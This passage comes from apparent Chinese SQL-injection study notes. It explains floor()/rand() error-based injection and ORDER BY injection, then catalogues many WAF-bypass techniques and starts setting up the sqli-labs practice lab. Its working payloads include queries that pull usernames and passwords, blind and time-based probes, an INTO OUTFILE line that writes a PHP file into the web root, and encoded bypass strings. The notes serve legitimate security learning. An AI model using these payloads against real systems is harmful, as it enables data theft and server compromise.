<p>那么我们来推断一下，第一次执行，<code>key</code>应该为<code>x0</code>，但是<code>x0</code>不存在，因此<code>rand(0)</code>又计算了一遍，最终第一次执行结果为<code>x1</code>。</p>
<p>第二次执行，这时候<code>key</code>应该为<code>x1</code>，已存在，则值加一即可。</p>
<p>第三次执行，这时候key应该为<code>x0</code>，不存在，<code>rand(0)</code>重新计算一遍，最终应该插入的<code>key</code>为<code>x1</code>，这里就出了问题了，它会直接插入，从而导致主键重复报错，这就是该报错原理。</p>
<img src="/posts/31899/image-20250306003105176.png" class="" title="image-20250306003105176">

<p><strong>优化方案</strong></p>
<p>学习的<a href="https://www.freebuf.com/articles/web/257881.html">这篇文章</a>，将<code>rand(0)</code>改为了<code>rand(14)</code>，运行一下看看。</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="built_in">floor</span>(rand(<span class="number">14</span>)<span class="operator">*</span><span class="number">2</span>) <span class="keyword">from</span> information_schema.tables limit <span class="number">0</span>,<span class="number">8</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">floor</span>(rand(<span class="number">14</span>)<span class="operator">*</span><span class="number">2</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="operator">|</span>                 <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>                 <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>                 <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>                 <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>                 <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>                 <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>                 <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>                 <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="number">8</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></tbody></table></figure>

<p>这里只需要两条数据即可报错，但是如果只有一条数据<code>floor()</code>报错注入就不能用了，因为一条数据没办法重复。</p>
<h4 id="1-4-2-ORDER-BY注入"><a href="#1-4-2-ORDER-BY注入" class="headerlink" title="1.4.2 ORDER BY注入"></a>1.4.2 ORDER BY注入</h4><p>主要是不能使用联合注入，还有一些函数区别。</p>
<p><strong>验证方式</strong></p>
<p>升序降序</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">asc</span> # 升序</span><br><span class="line">?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">desc</span> # 降序</span><br></pre></td></tr></tbody></table></figure>

<p><code>rand()</code>函数验证，<code>rand()</code>每次结果随机，因此查询出结果顺序也是随机。</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">?sort<span class="operator">=</span>rand()</span><br><span class="line">?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> rand()</span><br></pre></td></tr></tbody></table></figure>

<p>延时验证，延时的时间为 (行数 * 1) 秒</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">?sort<span class="operator">=</span>sleep(<span class="number">1</span>)</span><br><span class="line">?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> sleep(<span class="number">1</span>)</span><br></pre></td></tr></tbody></table></figure>

<p><strong>利用方式</strong></p>
<p>报错注入</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> concat(username,password) <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)<span class="operator">%</span><span class="number">23</span> # <span class="built_in">floor</span>()</span><br><span class="line">?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">procedure</span> analyse(extractvalue(rand(),concat(<span class="number">0x3a</span>,version())),<span class="number">1</span>) # <span class="keyword">procedure</span> analyse</span><br></pre></td></tr></tbody></table></figure>

<p>布尔盲注和时间盲注使用<code>rand()</code>函数即可</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">?sort<span class="operator">=</span>rand(<span class="keyword">left</span>(database(),<span class="number">1</span>)<span class="operator">&gt;</span><span class="string">'r'</span>)</span><br><span class="line">?sort<span class="operator">=</span>rand(if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">114</span>,<span class="number">1</span>,sleep(<span class="number">1</span>)))</span><br></pre></td></tr></tbody></table></figure>

<p>写入文件，使用<code>lines terminated by</code>，<code>0x3c3f70687020706870696e666f28293b3f3e</code>是<code>&lt;php phpinfo();&gt;</code>的十六进制编码。</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">into</span> outfile "/var/www/html/less46.php" lines terminated <span class="keyword">by</span> <span class="number">0x3c3f70687020706870696e666f28293b3f3e</span></span><br></pre></td></tr></tbody></table></figure>



<h2 id="2-SQL注入绕过"><a href="#2-SQL注入绕过" class="headerlink" title="2. SQL注入绕过"></a>2. SQL注入绕过</h2><h3 id="2-1-空格字符绕过"><a href="#2-1-空格字符绕过" class="headerlink" title="2.1 空格字符绕过"></a>2.1 空格字符绕过</h3><p><code>%a0</code>：空格</p>
<p><code>%09</code>：TAB键（水平）</p>
<p><code>%0a</code>：新建一行</p>
<p><code>%0c</code>：新的一页</p>
<p><code>%0d</code>：return功能</p>
<p><code>%0b</code>：TAB键（垂直）</p>
<p><code>%00</code>：空字符</p>
<p><code>/**/</code>：替换空格</p>
<p><code>/*!*/</code>：内联注释</p>
<h3 id="2-2-大小写绕过"><a href="#2-2-大小写绕过" class="headerlink" title="2.2 大小写绕过"></a>2.2 大小写绕过</h3><figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">UniOn</span> <span class="keyword">SelEcT</span></span><br></pre></td></tr></tbody></table></figure>



<h3 id="2-3-浮点数绕过"><a href="#2-3-浮点数绕过" class="headerlink" title="2.3 浮点数绕过"></a>2.3 浮点数绕过</h3><figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">8E0</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">8.0</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>;</span><br></pre></td></tr></tbody></table></figure>



<h3 id="2-4-NULL绕过"><a href="#2-4-NULL绕过" class="headerlink" title="2.4 NULL绕过"></a>2.4 NULL绕过</h3><p><code>\N</code>代表NULL</p>
<h3 id="2-5-引号绕过"><a href="#2-5-引号绕过" class="headerlink" title="2.5 引号绕过"></a>2.5 引号绕过</h3><figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span>"1" #双引号绕过</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="number">0x61646D696E</span>; # 字符串转换为<span class="number">16</span>进制</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(column_name)</span><br><span class="line"><span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> TABLE_NAME<span class="operator">=</span><span class="string">'users'</span> limit <span class="number">1</span>),<span class="number">4</span>; # 如果开启gpc，整数型也可以用十六进制绕过</span><br></pre></td></tr></tbody></table></figure>



<h3 id="2-6-添加库名绕过"><a href="#2-6-添加库名绕过" class="headerlink" title="2.6 添加库名绕过"></a>2.6 添加库名绕过</h3><figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> users;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> test.users;</span><br></pre></td></tr></tbody></table></figure>



<h3 id="2-7-去重复绕过"><a href="#2-7-去重复绕过" class="headerlink" title="2.7 去重复绕过"></a>2.7 去重复绕过</h3><p>在 mysql 查询可以使用 distinct 去除查询的重复值。可以利用这点突破waf 拦截。</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">distinct</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> users;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">distinct</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,version() fromusers;</span><br></pre></td></tr></tbody></table></figure>



<h3 id="2-8-反引号绕过"><a href="#2-8-反引号绕过" class="headerlink" title="2.8 反引号绕过"></a>2.8 反引号绕过</h3><p>字段加反引号可以绕过一些WAF拦截。</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> `test.users`;</span><br></pre></td></tr></tbody></table></figure>



<h3 id="2-9-语言特性绕过"><a href="#2-9-语言特性绕过" class="headerlink" title="2.9 语言特性绕过"></a>2.9 语言特性绕过</h3><p>在 php 语言中 id=1&amp;id=2 后面的值会自动覆盖前面的值，不同的语言有不同的特性。可以利用这点绕过一些 waf 的拦截。</p>
<table>
<thead>
<tr>
<th align="center">服务器中间件</th>
<th align="center">解析结果</th>
<th align="center">举例说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">ASP.NET/IIS</td>
<td align="center">所有出现的参数值用逗号连接</td>
<td align="center">color=red,blue</td>
</tr>
<tr>
<td align="center">ASP/IIS</td>
<td align="center">所有出现的参数用逗号连接</td>
<td align="center">color=red,blue</td>
</tr>
<tr>
<td align="center">PHP/Apache</td>
<td align="center">仅最后一次出现参数值</td>
<td align="center">color=blue</td>
</tr>
<tr>
<td align="center">PHP/Zeus</td>
<td align="center">仅最后一次出现参数值</td>
<td align="center">color=blue</td>
</tr>
<tr>
<td align="center">JSP,Servlet/Apache Tomcat</td>
<td align="center">仅第一次出现参数值</td>
<td align="center">color=red</td>
</tr>
<tr>
<td align="center">JSP,Servlet/Oracle Application Server 10g</td>
<td align="center">仅第一次出现参数值</td>
<td align="center">color=red</td>
</tr>
<tr>
<td align="center">JSP,Servlet/Jetty</td>
<td align="center">仅第一次出现参数值</td>
<td align="center">color=red</td>
</tr>
<tr>
<td align="center">IBM Lotus Domino</td>
<td align="center">仅最后一次出现参数值</td>
<td align="center">color=blue</td>
</tr>
<tr>
<td align="center">IBM HTTP Server</td>
<td align="center">仅第一次出现参数值</td>
<td align="center">color=red</td>
</tr>
<tr>
<td align="center">mod_perl,libapreq2/Apache</td>
<td align="center">仅第一次出现参数值</td>
<td align="center">color=red</td>
</tr>
<tr>
<td align="center">Perl CGI/Apache</td>
<td align="center">仅第一次出现参数值</td>
<td align="center">color=red</td>
</tr>
<tr>
<td align="center">mod_wsgi(Python)/Apache</td>
<td align="center">仅第一次出现参数值</td>
<td align="center">color=red</td>
</tr>
<tr>
<td align="center">Python/Zope</td>
<td align="center">转化为List</td>
<td align="center">color=[‘red’,’blue’]</td>
</tr>
</tbody></table>
<h3 id="2-10-逗号绕过"><a href="#2-10-逗号绕过" class="headerlink" title="2.10 逗号绕过"></a>2.10 逗号绕过</h3><p><code>substr</code></p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span>(substr(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br></pre></td></tr></tbody></table></figure>

<p><code>mid</code></p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> mid(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br></pre></td></tr></tbody></table></figure>

<p><code>join</code></p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b</span><br></pre></td></tr></tbody></table></figure>

<p><code>like</code></p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">like</span> <span class="string">'%r%'</span>;</span><br></pre></td></tr></tbody></table></figure>

<p><code>offset</code></p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span></span><br></pre></td></tr></tbody></table></figure>



<h3 id="2-11-or-and-xor-not绕过"><a href="#2-11-or-and-xor-not绕过" class="headerlink" title="2.11 or and xor not绕过"></a>2.11 or and xor not绕过</h3><p><code>&amp;&amp;</code>等价于and</p>
<p><code>||</code>等价于or</p>
<p><code>!</code>等价于not</p>
<p><code>|</code>等价于xor</p>
<h3 id="2-12-ASCII字符对比绕过"><a href="#2-12-ASCII字符对比绕过" class="headerlink" title="2.12 ASCII字符对比绕过"></a>2.12 ASCII字符对比绕过</h3><figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(<span class="built_in">substring</span>(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">114</span>; # <span class="type">char</span>(<span class="number">114</span>)<span class="operator">=</span><span class="string">'r'</span></span><br></pre></td></tr></tbody></table></figure>



<h3 id="2-13-等号绕过"><a href="#2-13-等号绕过" class="headerlink" title="2.13 等号绕过"></a>2.13 等号绕过</h3><figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">ascii(<span class="built_in">substring</span>(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&lt;</span><span class="number">115</span>; # <span class="operator">&gt;</span> <span class="operator">&lt;</span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">substring</span>(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>)<span class="keyword">like</span> <span class="string">'r%'</span>; #<span class="keyword">like</span> rlike</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>() regexp <span class="string">'^r'</span>; # regexp</span><br></pre></td></tr></tbody></table></figure>



<h3 id="2-14-双写绕过"><a href="#2-14-双写绕过" class="headerlink" title="2.14 双写绕过"></a>2.14 双写绕过</h3><figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">uniunionon seleselectct</span><br></pre></td></tr></tbody></table></figure>



<h3 id="2-15-二次编码绕过"><a href="#2-15-二次编码绕过" class="headerlink" title="2.15 二次编码绕过"></a>2.15 二次编码绕过</h3><p><code>-1 union select 1,2,3,4# </code></p>
<p>第一次编码：</p>
<p><code>%2d%31%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%32%2c%33%2c%34%23 </code></p>
<p>第二次编码：</p>
<p><code>%25%32%64%25%33%31%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%33%31%25%32%63%25%33%32%25%32%63%25%33%33%25%32%63%25%33%34%25%32%33</code></p>
<h3 id="2-16-参数拆分绕过"><a href="#2-16-参数拆分绕过" class="headerlink" title="2.16 参数拆分绕过"></a>2.16 参数拆分绕过</h3><p>对于a=[input1]&amp;b=[input2] 可以将参数 a 和 b 拼接在 SQL 语句中，但是过滤了<code>union select</code>，可以使用参数拆分</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">'union/*&amp;username=*/select 1,user(),3,4--+</span></span><br></pre></td></tr></tbody></table></figure>



<h3 id="2-17-生僻函数绕过"><a href="#2-17-生僻函数绕过" class="headerlink" title="2.17 生僻函数绕过"></a>2.17 生僻函数绕过</h3><figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> polygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> @<span class="variable">@version</span>) f) x)); # polygon()替换updatexml()</span><br></pre></td></tr></tbody></table></figure>



<h3 id="2-18-分块传输绕过"><a href="#2-18-分块传输绕过" class="headerlink" title="2.18 分块传输绕过"></a>2.18 分块传输绕过</h3><p>​	如果在 http 的消息头里 Transfer-Encoding 为 chunked，那么就是使用chunk编码方式。</p>
<p>​	接下来会发送数量未知的块，每一个块的开头都有一个十六进制的数,表明这个块的大小，然后接 CRLF(“\r\n”)。然后是数据本身，数据结束后，还会有CRLF(“\r\n”)两个字符。有一些实现中，块大小的十六进制数和CRLF 之间可以有空格，最后一块大小为0，表示数据发送结束。</p>
<h3 id="2-19-信任白名单绕过"><a href="#2-19-信任白名单绕过" class="headerlink" title="2.19 信任白名单绕过"></a>2.19 信任白名单绕过</h3><p>WAF会自带一些文件白名单，可以利用白名单绕过</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="operator">/</span>phpmyadmin?name<span class="operator">=</span><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,<span class="keyword">user</span>()<span class="comment">--+&amp;submit=1</span></span><br></pre></td></tr></tbody></table></figure>



<h3 id="2-20-pipline绕过"><a href="#2-20-pipline绕过" class="headerlink" title="2.20 pipline绕过"></a>2.20 pipline绕过</h3><p>​	http协议是由tcp协议封装而来，当浏览器发起一个http请求时，浏览器先和服务器建立起连接tcp连接，然后发送http数据包（即我们用burpsuite截获的数据），其中包含了一个Connection字段，一般值为close，Apache等容器根据这个字段决定是保持该tcp连接或是断开。当发送的内容太大，超过一个http 包容量，需要分多次发送时，值会变成 keep-alive，即本次发起的http 请求所建立的tcp连接不断开，直到所发送内容结束 Connection 为 close 为止。</p>
<p>​	用burpsuite抓包提交，复制整个包信息放在第一个包最后，把第一个包close改成keep-alive把brupsuite自动更新Content-Length勾去掉，有些WAF不会对第一个包的参数进行检测。</p>
<h3 id="2-21-利用multipart-form-data绕过"><a href="#2-21-利用multipart-form-data绕过" class="headerlink" title="2.21 利用multipart/form-data绕过"></a>2.21 利用multipart/form-data绕过</h3><p>​	multipart/form-data 表示该数据被编码为一条消息，页上的每个控件对应消息中的一个部分。所以，当 waf 没有规则匹配该协议传输的数据时可被绕过。</p>
<h3 id="2-22-order-by-绕过"><a href="#2-22-order-by-绕过" class="headerlink" title="2.22 order by 绕过"></a>2.22 order by 绕过</h3><figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">into</span> <span class="variable">@a</span>,<span class="variable">@b</span>,<span class="variable">@c</span>,<span class="variable">@d</span>; # 替代<span class="keyword">order</span> <span class="keyword">by</span>猜解字段数</span><br></pre></td></tr></tbody></table></figure>



<h3 id="2-23-修改请求方式绕过"><a href="#2-23-修改请求方式绕过" class="headerlink" title="2.23 修改请求方式绕过"></a>2.23 修改请求方式绕过</h3><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_REQUEST</span>[<span class="string">'id'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>可以更改请求方式尝试绕过。</p>
<h3 id="2-24-大量字符绕过"><a href="#2-24-大量字符绕过" class="headerlink" title="2.24 大量字符绕过"></a>2.24 大量字符绕过</h3><figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span>)<span class="operator">=</span>(<span class="keyword">select</span> <span class="number">0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>)<span class="comment">/*!union*/</span><span class="comment">/*!select*/</span><span class="number">1</span>,<span class="keyword">user</span>()</span><br></pre></td></tr></tbody></table></figure>



<h3 id="2-25-花括号绕过"><a href="#2-25-花括号绕过" class="headerlink" title="2.25 花括号绕过"></a>2.25 花括号绕过</h3><figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span>{x <span class="number">1</span>},<span class="keyword">user</span>(); # 花括号左边是注释的内容</span><br></pre></td></tr></tbody></table></figure>



<h3 id="2-26-union-select绕过"><a href="#2-26-union-select绕过" class="headerlink" title="2.26 union select绕过"></a>2.26 union select绕过</h3><figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">sel<span class="operator">&lt;&gt;</span>ect # 程序过滤<span class="operator">&lt;&gt;</span>为空 脚本处理</span><br><span class="line">sele<span class="comment">/**/</span>ct # 程序过滤<span class="comment">/**/</span>为空</span><br><span class="line"><span class="comment">/*!%53eLEct*/</span> # url 编码与内联注释</span><br><span class="line">se<span class="operator">%</span><span class="number">0</span>blect # 使用空格绕过</span><br><span class="line">sele<span class="operator">%</span>ct # 使用百分号绕过</span><br><span class="line"><span class="operator">%</span><span class="number">53</span>eLEct # 编码绕过</span><br><span class="line"><span class="keyword">uNIoN</span> <span class="keyword">sELecT</span> <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">DISTINCT</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="keyword">null</span><span class="operator">+</span><span class="keyword">UNION</span><span class="operator">+</span><span class="keyword">SELECT</span><span class="operator">+</span><span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="comment">/*!union*/</span><span class="comment">/*!select*/</span><span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="keyword">and</span>(<span class="keyword">select</span> <span class="number">1</span>)<span class="operator">=</span>(<span class="keyword">Select</span> <span class="number">0xA</span><span class="operator">*</span><span class="number">1000</span>)<span class="comment">/*!uNIOn*/</span><span class="comment">/*!SeLECt*/</span> <span class="number">1</span>,<span class="keyword">user</span>()</span><br><span class="line"><span class="comment">/*!50000union*/</span><span class="comment">/*!50000select*/</span><span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="comment">/*!40000union*/</span><span class="comment">/*!40000select*/</span><span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="operator">%</span><span class="number">0</span>aunion<span class="operator">%</span><span class="number">0</span>aselect <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="operator">%</span><span class="number">250</span>aunion<span class="operator">%</span><span class="number">250</span>aselect <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="operator">%</span><span class="number">09</span><span class="keyword">union</span><span class="operator">%</span><span class="number">09</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="operator">%</span><span class="number">0</span>caunion<span class="operator">%</span><span class="number">0</span>cselect <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="operator">%</span><span class="number">0</span>daunion<span class="operator">%</span><span class="number">0</span>dselect <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="operator">%</span><span class="number">0</span>baunion<span class="operator">%</span><span class="number">0</span>bselect <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="operator">%</span><span class="number">0</span>d<span class="operator">%</span><span class="number">0</span>aunion<span class="operator">%</span><span class="number">0</span>d<span class="operator">%</span><span class="number">0</span>aselect <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="comment">--+%0d%0aunion--+%0d%0aselect--+%0d%0a1,--+%0d%0a2</span></span><br><span class="line"><span class="comment">/*!12345union*/</span><span class="comment">/*!12345select*/</span><span class="number">1</span>,<span class="number">2</span>;</span><br><span class="line"><span class="comment">/*中文*/</span><span class="keyword">union</span><span class="comment">/*中文*/</span><span class="keyword">select</span><span class="comment">/*中文*/</span><span class="number">1</span>,<span class="number">2</span>;</span><br><span class="line"><span class="comment">/* */</span><span class="keyword">union</span><span class="comment">/* */</span><span class="keyword">select</span><span class="operator">/</span> <span class="operator">*</span><span class="operator">/</span><span class="number">1</span>,<span class="number">2</span>;</span><br><span class="line"><span class="comment">/*!union*/</span><span class="comment">/*!00000all*/</span><span class="comment">/*!00000select*/</span><span class="number">1</span>,<span class="number">2</span></span><br></pre></td></tr></tbody></table></figure>

<h3 id="2-27-information-schema绕过"><a href="#2-27-information-schema绕过" class="headerlink" title="2.27 information_schema绕过"></a>2.27 information_schema绕过</h3><p>使用<code>sys.schema_auto_increment_columns</code>、<code>mysql.innodb_table_stats</code>和<code>mysql.innodb_table_index</code>绕过</p>
<h2 id="3-sqli-labs通关"><a href="#3-sqli-labs通关" class="headerlink" title="3. sqli-labs通关"></a>3. sqli-labs通关</h2><p>这里跟着<a href="https://www.sqlsec.com/2020/05/sqlilabs.html">国光佬</a>学习</p>
<h3 id="3-1-准备工作"><a href="#3-1-准备工作" class="headerlink" title="3.1 准备工作"></a>3.1 准备工作</h3><p><strong>sqli-labs环境搭建</strong></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">docker pull acgpiano/sqli-labs</span><br><span class="line">docker run -dt --name sqli-labs -p 8888:80 acgpiano/sqli-labs:latest</span><br></pre></td></tr></tbody></table></figure>

<p>中间可能报错，只需要关闭代理就行。</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">Error response from daemon: Head <span class="string">"https://registry-1.docker.io/v2/acgpiano/sqli-labs/manifests/latest"</span>: Get <span class="string">"https://auth.docker.io/token?account=squarehhh&amp;scope=repository%3Aacgpiano%2Fsqli-labs%3Apull&amp;service=registry.docker.io"</span>: EOF</span><br></pre></td></tr></tbody></table></figure>

<p>访问网页，环境搭建完毕。</p>
<img src="/posts/31899/image-20250305014536324.png" class="" title="image-20250305014536324">

